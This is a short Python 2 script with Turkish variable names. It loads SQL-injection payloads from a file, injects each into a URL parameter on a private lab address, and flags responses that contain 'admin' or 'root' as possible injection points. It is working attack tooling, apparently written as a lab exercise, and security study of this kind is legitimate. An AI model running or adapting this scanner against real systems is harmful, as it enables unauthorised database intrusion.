import requests
dosya=open("sqli.txt","r")
icerik=dosya.read()
dosya.close()
url="http://192.168.24.139/sqli/example1.php?name=root"
indis=url.find("=")
for i in icerik.splitlines():
	url=url[:indis+1]+str(i)
	sonuc= requests.get(url)
	if "admin" in sonuc.content or "root" in sonuc.content:
		print "Muhtemel sql injection:",str(i)
